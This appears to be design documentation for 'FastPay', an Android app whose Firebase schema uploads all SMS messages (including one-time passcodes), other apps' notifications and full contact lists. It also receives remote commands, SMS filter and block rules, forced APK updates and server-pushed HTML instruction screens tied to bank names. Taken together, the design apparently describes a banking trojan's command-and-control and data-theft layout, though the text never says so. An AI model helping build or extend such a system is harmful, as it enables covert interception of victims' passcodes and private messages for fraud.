# Firebase Realtime Database Structure

## Overview
FastPay uses Firebase Realtime Database as the primary real-time data store. No Firestore or Firebase Auth is used - authentication is handled via Django backend.

---

## Database Paths

### 1. Device Path: `device/{deviceId}/`

Main device data storage.

```
device/{deviceId}/
├── code: String                      # Activation code (e.g., "ABC123")
├── isActive: String                  # "Opened" | "Closed"
├── name: String                      # Device name
├── model: String                     # "Brand Model" (e.g., "Samsung Galaxy S21")
├── bankcard: String                  # Always "BANKCARD"
├── time: Long                        # Registration timestamp (milliseconds)
├── batteryPercentage: Int            # 0-100 or -1 if unknown
│
├── Contact/                          # Synced contacts
│   └── {phoneNumber}/                # Key: normalized phone number
│       ├── id: String
│       ├── name: String
│       ├── displayName: String
│       ├── phoneNumber: String
│       ├── phones: Array<PhoneInfo>
│       │   └── {number, type, typeLabel, label?, isPrimary}
│       ├── emails: Array<EmailInfo>
│       │   └── {address, type, typeLabel, label?, isPrimary}
│       ├── addresses: Array<AddressInfo>
│       │   └── {street?, city?, region?, postcode?, country?, formattedAddress?, type, typeLabel}
│       ├── photoUri: String?
│       ├── company: String?
│       ├── jobTitle: String?
│       ├── websites: Array<String>
│       ├── birthday: String?
│       ├── notes: String?
│       └── isStarred: Boolean
│
├── systemInfo/                       # Device system information
│   └── permissionStatus: Map<String, Boolean>
│       ├── sms: Boolean
│       ├── contacts: Boolean
│       ├── phone: Boolean
│       ├── storage: Boolean
│       ├── notification: Boolean
│       └── ...
│
├── instructioncard/                  # Instruction display config
│   ├── html: String                  # HTML content for WebView
│   ├── css: String                   # CSS styles
│   ├── imageUrl: String?             # Optional image URL
│   ├── videoUrl: String?             # Optional video URL (mp4, autoplay+loop)
│   ├── documentUrl: String?          # Optional document URL (PDF with viewer, other files as download)
│   └── mode: Int                     # 0=in-card, 1=prompt (logo+card, rest recedes), 2=fullscreen
│
├── cardControl/                      # Card UI control
│   ├── showCard: String              # Card type to display
│   └── animation/                    # Animation triggers
│       └── type: String              # Animation type (one-time trigger)
│
├── animationSettings/                # Animation configuration
│   └── stopAnimationOn: Long?        # null = animation ON, timestamp = stop time
│
├── commands/                         # Remote commands
│   └── {commandName}: Any            # Command parameters
│
└── filter/                           # Message filtering rules
    ├── sms: String                   # SMS filter pattern
    ├── notification: String          # Notification filter pattern
    └── blockSms: String              # Block SMS rule
```

### 2. Messages Path: `message/{deviceId}/`

Flat structure for SMS messages.

```
message/{deviceId}/
└── {timestamp}: String               # Format: "received~{phone}~{body}" or "sent~{phone}~{body}"
```

**Example:**
```json
{
  "1706950800000": "received~+1234567890~Your OTP is 123456",
  "1706950900000": "sent~+1234567890~Thanks for the code"
}
```

### 3. Notifications Path: `notification/{deviceId}/`

Flat structure for captured notifications.

```
notification/{deviceId}/
└── {timestamp}: String               # Format: "{packageName}~{title}~{text}"
```

**Example:**
```json
{
  "1706950800000": "com.whatsapp~John~Hey, how are you?",
  "1706950900000": "com.google.android.gm~New Email~Your order has shipped"
}
```

### 4. Device List: `fastpay/{code}` (TESTING) or `fastpay/running/{code}` (RUNNING)

Links activation codes to devices.

```
fastpay/{code}/                       # TESTING mode
├── deviceId: String
├── number: String                    # Phone number
├── Bankstatus: Map<String, String>   # e.g., {"ACTIVE": "", "TESTING": ""}
├── BANK/
│   ├── bank_name: String
│   ├── company_name: String
│   └── other_info: String
├── status: String
├── status_text: String
├── created_at: Long
└── device_model: String

fastpay/running/{code}/               # RUNNING mode
├── deviceId: String
├── code: String
├── deviceName: String
└── ...
```

### 5. Heartbeat Path: `hertbit/{deviceId}/`

Device alive signal (note: intentional typo in path).

```
hertbit/{deviceId}/
├── t: Long                           # Timestamp (milliseconds)
└── b: Int                            # Battery percentage (only if changed)
```

### 6. App Config: `fastpay/app/`

Global app configuration.

```
fastpay/app/
├── version: Map<String, Any>         # Version check data
├── forceUpdateUrl: String            # Force update APK URL
└── config/
    ├── branding: Map<String, Any>
    └── theme: Map<String, Any>
```

---

## Firebase Listeners (What the App Listens To)

### ActivatedActivity Listeners
| Path | Type | Purpose |
|------|------|---------|
| `device/{deviceId}/code` | ValueEventListener | Activation code display |
| `device/{deviceId}/instructioncard` | ValueEventListener | Instruction card content |
| `device/{deviceId}/cardControl/showCard` | ValueEventListener | Card type to show |
| `device/{deviceId}/cardControl/animation` | ValueEventListener | Animation trigger |
| `fastpay/{code}/Bankstatus` | ValueEventListener | Bank status display |
| `fastpay/{code}/BANK/bank_name` | ValueEventListener | Bank name display |
| `fastpay/{code}/BANK/company_name` | ValueEventListener | Company name display |
| `message/{deviceId}` | ChildEventListener | Real-time SMS (limitToLast 100) |

### PersistentForegroundService Listeners
| Path | Type | Purpose |
|------|------|---------|
| `device/{deviceId}/commands` | ValueEventListener | Remote command execution |
| `device/{deviceId}/filter` | ValueEventListener | Message filter rules |
| `device/{deviceId}/isActive` | ValueEventListener | Active status changes |
| `device/{deviceId}/animationSettings` | ValueEventListener | Animation settings |

---

## Firebase Write Operations

### From App to Firebase
| Operation | Path | Data |
|-----------|------|------|
| Device init | `device/{deviceId}` | Full device object |
| SMS sync | `message/{deviceId}/{timestamp}` | "type~phone~body" |
| Notification sync | `notification/{deviceId}/{timestamp}` | "package~title~text" |
| Contact sync | `device/{deviceId}/Contact/{phone}` | Contact object |
| Heartbeat | `hertbit/{deviceId}` | {t: timestamp, b?: battery} |
| Status update | `device/{deviceId}/isActive` | "Opened"/"Closed" |
| Animation settings | `device/{deviceId}/animationSettings` | {stopAnimationOn: timestamp} |

---

## Firebase Storage Paths

```
inputs/{deviceId}/                    # Device-specific uploads
app/apk/FastPay-v{version}.apk        # Release APK
app/apk/FastPay-urgent-v{version}.apk # Urgent update APK
```

---

## Data Types Reference

| Field | Type | Example |
|-------|------|---------|
| deviceId | String | "abc123def456" (Android ID) |
| timestamp | Long | 1706950800000 (milliseconds since epoch) |
| phone | String | "+1234567890" |
| code | String | "ABC123" |
| isActive | String | "Opened" or "Closed" |
| batteryPercentage | Int | 0-100 or -1 |
